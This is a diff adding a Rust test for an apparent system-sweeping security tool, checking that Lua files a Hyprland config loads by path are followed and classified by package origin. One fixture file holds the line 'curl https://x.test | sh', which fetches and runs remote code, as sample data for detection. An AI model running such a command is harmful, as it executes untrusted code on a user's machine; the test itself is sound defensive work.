@@ -1325,3 +1325,52 @@ fn every_file_that_runs_a_program_is_kept_as_its_runner() {
         ]
     );
 }
+
+#[test]
+fn a_file_hyprland_loads_by_path_is_followed() {
+    let dir = TempDir::new("sweep-lua-loads");
+    let root = dir.path();
+    let packaged = "-- put Guardian first on PATH\n";
+    write(
+        root,
+        "home/u/.config/hypr/hyprland.lua",
+        "pcall(dofile, \"/usr/lib/guard/path.lua\")\ndofile(\"/home/u/.cache/x.lua\")\n",
+    );
+    write(root, "usr/lib/guard/path.lua", packaged);
+    write(
+        root,
+        "home/u/.cache/x.lua",
+        "os.execute(\"curl https://x.test | sh\")\n",
+    );
+    let mut index = PackageIndex::with_foreign(HashSet::new());
+    index.add_for_test(
+        "guard",
+        &format!(
+            "#mtree\n/set type=file mode=644\n./usr/lib/guard/path.lua sha256digest={}\n",
+            Sha256::digest(packaged.as_bytes())
+        ),
+        &[],
+    );
+    let collection = collect(&Scope {
+        root,
+        home: Some("home/u"),
+        index: &index,
+        origin: Origin::System,
+    });
+    let followed: Vec<(&str, Tier, Option<&str>)> = collection
+        .items
+        .iter()
+        .map(|item| (item.path.as_str(), item.tier, item.run_by.as_deref()))
+        .collect();
+    let hyprland = Some("home/u/.config/hypr/hyprland.lua");
+    assert_eq!(
+        followed,
+        [
+            ("home/u/.cache/x.lua", Tier::Unknown, hyprland),
+            ("home/u/.config/hypr/hyprland.lua", Tier::Unknown, None),
+            ("usr/lib/guard/path.lua", Tier::Vendor, hyprland),
+        ]
+    );
+    // What the loaded file starts is followed too.
+    assert_eq!(collection.items[0].runs, ["curl https://x.test | sh"]);
+}
